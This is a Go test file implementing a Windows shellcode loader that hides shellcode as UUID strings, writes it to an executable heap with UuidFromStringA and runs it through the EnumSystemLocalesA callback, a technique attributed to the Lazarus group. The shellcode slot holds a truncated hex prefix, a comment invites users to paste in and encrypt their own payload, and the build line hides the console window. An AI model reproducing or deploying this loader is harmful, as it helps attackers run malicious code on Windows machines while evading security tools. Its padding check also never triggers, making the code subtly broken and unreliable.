//go:build windows
// +build windows

package other

//大佬gist嫖来的代码，记录一下：https://gist.github.com/ramoncjs3/a801bbb9d845102063115fb9d59b622d
// Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

/*
	This program executes shellcode in the current process using the following steps:
		1. Create a Heap and allocate space
		2. Convert shellcode into an array of UUIDs
		3. Load the UUIDs into memory (on the allocated heap) by (ab)using the UuidFromStringA function
		4. Execute the shellcode by (ab)using the EnumSystemLocalesA function
*/

// Reference: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala

import (
	// Standard
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"testing"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/google/uuid"
)

func Test_uuid(t *testing.T) {
	// 在这填shellcode,也可以再加密啥的
	shellcode, err := hex.DecodeString("fc4883e4f0e8c8000000415141505251564831d···shellcode")
	if err != nil {
		return
	}
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err))
	}

	// Convert shellcode to UUIDs

	uuids, err := shellcodeToUUID(shellcode)
	if err != nil {
		log.Fatal(err.Error())
	}

	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")

	/* https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
		HANDLE HeapCreate(
			DWORD  flOptions,
			SIZE_T dwInitialSize,
			SIZE_T dwMaximumSize
		);
	  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	*/

	// Create the heap
	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))

	}

	/*	https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
		DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
		HANDLE hHeap,
		DWORD  dwFlags,
		SIZE_T dwBytes
		);
	*/

	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}

	/*
		RPC_STATUS UuidFromStringA(
		RPC_CSTR StringUuid,
		UUID     *Uuid
		);
	*/

	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
		}

		addrPtr += 16
	}

	/*
		BOOL EnumSystemLocalesA(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/

	// Execute Shellcode

	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
	}

}

// shellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
// converts the first 8 bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
func shellcodeToUUID(shellcode []byte) ([]string, error) {

	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 > 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems unecessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}

// export GOOS=windows GOARCH=amd64;go build -o UuidFromString.exe -trimpath -ldflags="-w -s -H=windowsgui" uuid_test.go
